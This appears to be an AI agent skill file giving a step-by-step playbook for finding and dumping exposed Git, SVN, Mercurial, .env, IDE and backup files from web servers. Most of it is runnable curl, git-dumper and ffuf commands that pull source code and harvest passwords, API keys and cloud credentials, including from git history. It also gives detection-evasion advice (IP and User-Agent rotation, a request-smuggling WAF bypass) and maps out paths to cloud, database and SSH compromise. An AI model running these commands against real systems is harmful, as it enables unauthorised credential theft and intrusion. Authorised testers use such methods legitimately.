---
name: insecure-source-code-mgmt
description: Detect exposed source code management — .git, .svn, .hg, backup files, IDE artifacts, and environment config exposure on web servers
version: 1.0.0
phase: recon
category: reconnaissance
tags: [git, svn, source-code, exposure, information-disclosure]
tools: [curl, git-dumper, GitTools, dirsearch, ffuf, python3]
difficulty: beginner
opsec_level: low
time_estimate: 15m
severity_if_found: high
mitre_attack:
  - T1190
  - T1213
  - T1567
---

## When to Use

- Any web application during initial recon — especially staging/pre-production
- Target may have been developed with Git, SVN, or Mercurial (most modern projects)
- Technology stack unknown or using popular CMS (WordPress, Laravel, Django, Rails, Express)
- Any engagement where source code disclosure would significantly impact security
- Bug bounty or red team assessments where maximum attack surface is desired

**Severity note**: Source code disclosure is consistently rated HIGH because a single `.git/` dump yields database credentials, API keys, hardcoded secrets, internal architecture, business logic, and zero-day vulnerability discovery paths in one shot. A `.env` file alone often compromises the entire infrastructure.

## What It Does

Detects and extracts exposed version control artifacts and sensitive configuration files from web servers:

- **`.git/HEAD` detection** — confirms Git repository exposure with a single HTTP request
- **Full repo dumping** — extracts every committed file via GitTools or git-dumper, including full git history
- **`.svn/entries` detection** — identifies Subversion working copy exposure and dumps via wc.db (SQLite) or pristine copies
- **`.hg/` Mercurial detection** — identifies Mercurial repository artifacts (requires, branch, 00changelog.i)
- **`.DS_Store` file extraction** — reveals directory listings from macOS metadata files (parsed via strings or ds-store)
- **`.env`/`.env.local`/`.env.production` detection** — identifies files containing DB credentials, cloud keys, and secrets
- **IDE artifact detection** — finds `.idea/`, `.vscode/`, `*.sublime-*` exposing project config, SFTP creds, deployment targets
- **Backup file discovery** — finds `.bak`, `~`-suffix, `.old`, `.swp`, `.swo` backup artifacts from editors and deployments
- **Dependency file leaks** — `composer.json`, `package.json`, `Gemfile`, `requirements.txt` revealing framework versions with known CVEs
- **Cloud credential files** — AWS/GCP/Azure credential files in exposed directories
- **`robots.txt` disallowed path verification** — validates that disallowed paths don't hide sensitive content
- **Automated wordlist scanning** — orchestrates comprehensive discovery via ffuf or dirsearch

## Methodology

### Step 1: Quick Single-Request Detection
```bash
# Check all critical artifacts in one sweep
for path in .git/HEAD .svn/entries .hg/requires .env .env.local .env.production \
  .idea/workspace.xml .vscode/settings.json composer.json package.json Gemfile \
  requirements.txt .htaccess.bak wp-config.php.bak index.php.bak index.php~ \
  .DS_Store config.php.old config.php~; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/$path")
  [ "$status" != "404" ] && echo "[!] $path → HTTP $status"
done
```
**A 200 OK on `.git/HEAD` is critical** — stop all other scanning and dump the repo immediately. Every additional request risks the target noticing and closing the exposure.

### Step 2: Full Git Repo Dump
```bash
# Step 2a: Dump the repository
git clone https://github.com/internetwache/GitTools.git
./GitTools/Dumper/gitdumper.sh https://$TARGET/.git/ /tmp/dumped/
# Alternative: git-dumper (Python, often faster for partial dumps)
git-dumper https://$TARGET/.git/ /tmp/dumped/

# Step 2b: Extract all files and search for secrets
cd /tmp/dumped && git checkout -f HEAD
grep -r -i --include="*.{php,env,yml,json,py,rb,js,ts}" \
  -E '(password|secret|api[_-]?key|token|credential|DB_HOST|AWS_ACCESS_KEY|PRIVATE_KEY)' .

# Step 2c: Check git history for removed secrets
git log --oneline --all
git log -p --diff-filter=D | grep -i -E '(password|secret|token|api.?key|AKIA)' | head -50

# Step 2d: Check all branches for credentials
for branch in $(git branch -r | grep -v HEAD); do
  git checkout $branch --quiet 2>/dev/null
  grep -r -i -E '(password|secret|api.?key)' --include="*.env" . 2>/dev/null
done
```
**After dump**: The entire source code, DB passwords, API keys, and internal architecture are exposed. Keep output secure — handle credentials through proper disclosure channels.

### Step 3: SVN & Mercurial
```bash
# SVN via wc.db (SQLite database)
curl -s https://$TARGET/.svn/wc.db -o wc.db
sqlite3 wc.db "SELECT local_relpath FROM NODES;" 2>/dev/null

# SVN legacy pristine copies (older clients)
curl -s "https://$TARGET/.svn/text-base/index.php.svn-base" -o index.php

# Mercurial
curl -s https://$TARGET/.hg/requires && curl -s https://$TARGET/.hg/branch
curl -s https://$TARGET/.hg/00changelog.i | head -5
```

### Step 4: Environment Files & IDE Artifacts
```bash
# Exhaustive env file scan
for env in .env .env.local .env.production .env.development .env.staging \
  .env.test .env.backup env.txt config.env .flaskenv .django_env; do
  content=$(curl -s "https://$TARGET/$env")
  [ -n "$content" ] && echo "=== $env ===" && echo "$content" && echo
done

# IDE artifacts that leak credentials
for path in .idea/workspace.xml .vscode/settings.json .vscode/sftp.json \
  .sublime-workspace .idea/deployment.xml; do
  content=$(curl -s "https://$TARGET/$path")
  echo "$content" | grep -qiE '(password|token|key|secret|credential|ssh|ftp)' && \
    echo "[!] $path contains secrets" && echo "$content" | head -10
done
```
**`.vscode/sftp.json`** is a jackpot — often contains FTP/SFTP credentials for production deployments. **`.idea/deployment.xml`** may contain server connection credentials.

### Step 5: Backup File Discovery
```bash
# Test backup extensions across common filenames
for base in index config wp-config admin main app db auth setup install; do
  for ext in .bak .old .orig .backup .copy .tmp .swp .swo .swn ~ \
    .php.bak .php.old .txt.bak .inc.bak; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/$base$ext")
    [ "$status" == "200" ] && echo "[!] $base$ext" && \
      curl -s -I "https://$TARGET/$base$ext" | grep -i content-type
  done
done

# robots.txt disallowed path verification
curl -s https://$TARGET/robots.txt | grep -i 'Disallow' | awk '{print $2}' | while read p; do
  echo "$p → HTTP $(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET$p")"
done
```

### Step 6: Automated Wordlist Scanning
```bash
# Focused wordlist covering the highest-value paths
cat << 'EOF' > sccm_wordlist.txt
.git/HEAD .git/config .git/refs/heads/master .git/logs/HEAD .git/index
.svn/entries .svn/wc.db .svn/all-wcprops .hg/requires .hg/branch .hg/00changelog.i
.DS_Store .env .env.local .env.production .env.development .env.staging .env.backup
composer.json package.json yarn.lock package-lock.json Gemfile Gemfile.lock
requirements.txt Pipfile Pipfile.lock go.mod go.sum Cargo.toml
.idea/workspace.xml .idea/modules.xml .idea/deployment.xml
.vscode/settings.json .vscode/launch.json .vscode/sftp.json
.sublime-workspace .sublime-project
index.php.bak config.php.old wp-config.php.bak .htaccess.bak .htpasswd
nginx.conf web.config.bak robots.txt sitemap.xml crossdomain.xml
EOF

ffuf -u https://$TARGET/FUZZ -w sccm_wordlist.txt -fc 404 -c -t 50 -o sccm_results.json
```

## Detection & OPSEC

**Triggers**: Requests to `/.git/HEAD`, `/.git/config` are extremely obvious in access logs. Full git dumps generate 1000+ sequential object requests. Requests to `.svn/entries`, `.env`, `.idea/`, `.vscode/` are non-standard and easily spotted. Bulk 404s followed by 200s is the telltale signature of directory busting.

**Countermeasures**: Speed is dangerous — add `--delay 200ms` to dumpers. Rotate User-Agents per request. Rotate IPs between `.git/HEAD` check and full dump (use different proxies). Single-request check first — don't pre-scan aggressively. Try alternative base paths: `/main/.git/HEAD`, `/app/.git/HEAD`, `/backend/.git/HEAD`, `/api/.git/HEAD`. For WAF bypass, try: `GET /anything HTTP/1.1\r\nHost: target\r\n\r\nGET /.git/HEAD`.

**Evidence**: Full HTTP response headers (Server, X-Powered-By), `.git/config` contents (remote origin URL may leak private repos), dumped repo file tree (`git ls-files`), `.env` file contents (handle securely), dependency files with version info, robots.txt disallowed paths, screenshots of exposed directory listings.

**Escalation paths**:
- `.env` with cloud credentials → full cloud account compromise
- `.git/config` with remote origin → compromise linked private repository
- Full git dump with DB credentials → direct database access
- `.ssh/` or `id_rsa` in repo → SSH access to production servers
- `.vscode/sftp.json` → FTP/SFTP credentials for server access
- `composer.json` with outdated deps → known CVE exploitation

## References

- [GitTools — Automated .git extraction](https://github.com/internetwache/GitTools)
- [git-dumper — Python git dumper](https://github.com/arthaud/git-dumper)
- [DS_Store parser](https://github.com/gehaxelt/Python-dsstore)
- [OWASP Information Disclosure Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_for_Information_Gathering)
- [dirsearch — Web path scanner](https://github.com/maurosoria/dirsearch)
- [ffuf — Fuzz Faster U Fool](https://github.com/ffuf/ffuf)
- [MITRE T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE T1213 — Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)
- [MITRE T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)
